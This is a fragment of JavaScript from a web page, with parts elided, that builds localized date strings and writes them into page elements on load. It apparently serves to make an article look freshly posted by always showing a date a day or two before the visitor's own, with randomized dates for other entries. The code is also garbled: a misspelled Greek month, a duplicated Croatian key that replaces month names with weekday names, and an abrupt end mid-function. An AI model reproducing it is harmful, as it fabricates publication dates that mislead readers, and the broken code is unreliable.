function dtime_nums(e) {
    ...
    var r = a.getDate(),
        i = a.getDay(),
        n = a.getMonth();
    return days_localized[lang_loc][i] + ", " + months_localized[lang_loc][n] + " " + r + ", " + a.getFullYear()
}

function postDate() {
    var e = new Date;
    return e.setDate(e.getDate() - 2), {
        day: e.getDate() + 1,
        month: months_localized[lang_loc][e.getMonth()],
        year: e.getFullYear()
    }
}
var lang_loc = "en",
    months_localized = {
        ...
        el: ["Ιανουάριος", "Φεβρουάριος", "Μάρτιος", "Απρίλιος", "Μάιος", "Ιούνιοwς", "Ιούλιος", "Αύγουστος", "Σεπτέμβριος", "Οκτώβριος", "Νοέμβριος", "Δεκέμβριος"],
        th: ["มกราคม", "กุมภาพันธ์", "มีนาคม", "เมษายน", "พฤษภาคม", "มิถุนายน", "กรกฎาคม", "สิงหาคม", "กันยายน", "ตุลาคม", "พฤศจิกายน", "ธันวาคม"],
        vi: ["Tháng 1", "Tháng 2", "Tháng 3", "Tháng 4", "Tháng 5", "Tháng 6", "Tháng 7", "Tháng 8", "Tháng 9", "Tháng 10", "Tháng 11", "Tháng 12"],
        hr: ["siječanj", "veljača", "ožujak", "travanj", "svibanj", "lipanj", "srpanj", "kolovoz", "rujan", "listopad", "studeni", "prosinac"],
        hr: ["nedjelja", "ponedjeljak", "utorak", "srijeda", "četvrtak", "petek", "subota"],
...
window.addEventListener("DOMContentLoaded", (function () {
    var e = document.getElementsByClassName("ryear"),
        a = document.getElementsByClassName("rdate"),
        r = 0,
        i = postDate();
    if (document.getElementById("date").innerHTML = i.day + ", " + i.month + ", " + i.year, a.length > 0)
        for (var n = a.length; n > 0; n--) r += Math.round(2 * Math.random() - .5), a[a.length - n].innerHTML = dtime_nums(2 + r);
    if (e.length > 0)
        for (var t = (new Date).getFullYear(), o = 0; o < e.length; o++) e[o].innerHTML = t
}));
(function (o, d, l) {
    try {
